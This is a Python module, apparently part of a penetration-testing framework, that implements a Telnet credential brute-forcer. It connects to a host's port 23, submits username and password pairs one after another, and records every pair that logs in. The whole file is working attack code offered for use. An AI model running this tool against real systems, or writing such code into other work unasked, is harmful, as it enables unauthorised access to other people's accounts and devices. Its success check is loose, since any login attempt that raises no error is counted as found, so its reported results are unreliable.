from jframework.modules.login._bruteforce import _Bruteforce
import sys
import telnetlib

class Telnetbruteforce(_Bruteforce):

    def worker(self, user, password):
        try:
            tn = telnetlib.Telnet(self.HOST, 23, 1)
            tn.read_until((b"login: " or b"Login: " ))
            tn.write(user.encode("ascii") + b"\n")
            tn.read_until((b"Password: " or b"password: "))
            tn.write(password.encode("ascii") + b"\n")
            tn.write(b"dir\n")
            tn.write(b"exit\n")
            tn.read_all()
            tn.close()
            self.print_result(user, password, error=False)
            self.login_found += 1
        except Exception as e:
            if (self.verb):
                self.print_result(user, password, error=True)
            try:
                tn.close()
            except:
                pass
        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        try:
            tn = telnetlib.Telnet(self.HOST)
            resp = tn.expect([b"login: ", b"Login: "], 3)
            tn.close()
            if resp[1] is None:
                raise Exception
        except:
            print("It doesn't work with that kind of telnet")
            return

        super(Telnetbruteforce, self).run()